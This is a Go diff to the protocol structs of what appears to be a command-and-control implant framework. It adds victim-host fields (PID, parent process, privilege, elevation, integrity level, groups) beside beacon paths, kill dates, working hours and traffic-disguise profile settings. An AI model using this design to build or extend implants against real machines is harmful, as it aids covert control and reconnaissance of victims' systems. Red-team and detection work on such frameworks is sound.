@@ -1,18 +1,27 @@
 package protocol
 
 type Identity struct {
-	Hostname  string `json:"hostname"`
-	Username  string `json:"username"`
-	MachineID string `json:"machine_id"`
-	OS        string `json:"os"`
-	Arch      string `json:"arch"`
-	Proto     int    `json:"proto"`
-	KillDays  int    `json:"kill_days"`
-	WorkStart int    `json:"work_start"`
-	WorkEnd   int    `json:"work_end"`
-	Stager    bool   `json:"stager,omitempty"`
+	Hostname     string `json:"hostname"`
+	Username     string `json:"username"`
+	MachineID    string `json:"machine_id"`
+	OS           string `json:"os"`
+	Arch         string `json:"arch"`
+	Proto        int    `json:"proto"`
+	KillDays     int    `json:"kill_days"`
+	WorkStart    int    `json:"work_start"`
+	WorkEnd      int    `json:"work_end"`
+	Stager       bool   `json:"stager,omitempty"`
 	IdentityRole string `json:"identity_role,omitempty"`
-	LocalAddr string `json:"local_addr,omitempty"`
+	LocalAddr    string `json:"local_addr,omitempty"`
+
+	PID        int      `json:"pid,omitempty"`
+	ParentPID  int      `json:"parent_pid,omitempty"`
+	ParentName string   `json:"parent_name,omitempty"`
+	SessionID  int      `json:"session_id,omitempty"`
+	Privilege  string   `json:"privilege,omitempty"`
+	Elevated   bool     `json:"elevated,omitempty"`
+	Integrity  string   `json:"integrity,omitempty"`
+	Groups     []string `json:"groups,omitempty"`
 }
 
 type CheckinRequest struct {
@@ -48,17 +57,17 @@ type Result struct {
 }
 
 type Profile struct {
-	UserAgent      string            `json:"user_agent"`
-	LinuxUserAgent string            `json:"linux_user_agent"`
-	BeaconPath     string            `json:"beacon_path"`
-	TasksPath      string            `json:"tasks_path"`
-	ResultsPath    string            `json:"results_path"`
-	ExtraHeaders   map[string]string `json:"extra_headers"`
-	RequestHeaders map[string]string `json:"request_headers"`
-	Status *ProfileStatus `json:"status,omitempty"`
-	CookieName string `json:"cookie_name,omitempty"`
+	UserAgent       string            `json:"user_agent"`
+	LinuxUserAgent  string            `json:"linux_user_agent"`
+	BeaconPath      string            `json:"beacon_path"`
+	TasksPath       string            `json:"tasks_path"`
+	ResultsPath     string            `json:"results_path"`
+	ExtraHeaders    map[string]string `json:"extra_headers"`
+	RequestHeaders  map[string]string `json:"request_headers"`
+	Status          *ProfileStatus    `json:"status,omitempty"`
+	CookieName      string            `json:"cookie_name,omitempty"`
 	ResponseHeaders map[string]string `json:"response_headers,omitempty"`
-	Stager *ProfileStager `json:"stager,omitempty"`
+	Stager          *ProfileStager    `json:"stager,omitempty"`
 }
 
 type ProfileStatus struct {
